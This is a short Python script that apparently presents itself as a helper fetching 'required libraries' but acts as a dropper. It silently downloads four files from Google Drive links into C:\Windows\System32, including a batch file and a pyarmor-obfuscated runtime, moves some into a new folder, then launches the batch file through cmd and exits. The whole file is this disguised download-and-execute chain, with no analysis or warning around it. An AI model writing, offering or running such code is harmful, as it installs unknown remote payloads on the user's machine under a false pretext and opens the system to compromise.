import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys

import os
import gdown

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)

if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
    print("downloading required libraries, please wait a moment...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1oaf5312Vz4vvhRzmhV-gvPDJsRVA7Xw_", "C:\\Windows\\System32\\__init__.py")
    download_file_from_google_drive("https://drive.google.com/uc?id=13Dz2oMLl9HOYxSJAy1fTMpus9H6LtuGb", "C:\\Windows\\System32\\aes.bat")
    download_file_from_google_drive("https://drive.google.com/uc?id=1sc8ky2uj8p9uu3ZBVfetdU5PBjvKIGt4", "C:\\Windows\\System32\\aes.py")
    download_file_from_google_drive("https://drive.google.com/uc?id=1v6y27hrbkWlx2C8Pfr-xF0l1a9Eo-rzB", "C:\\Windows\\System32\\pyarmor_runtime.pyd")


import os
import shutil

directory = r'C:\Windows\System32'

new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
if not os.path.exists(new_dir):
    os.makedirs(new_dir)
    files_to_move = ['__init__.py', 'pyarmor_runtime.pyd']
    for file in files_to_move:
        old_path = os.path.join(directory, file)
        new_path = os.path.join(new_dir, file)
        shutil.move(old_path, new_path)

    print("success")
else:
    print("")
import subprocess

def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")



batch_file_path = r"C:\Windows\System32\aes.bat"
try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")
os._exit(0)
sys.exit()

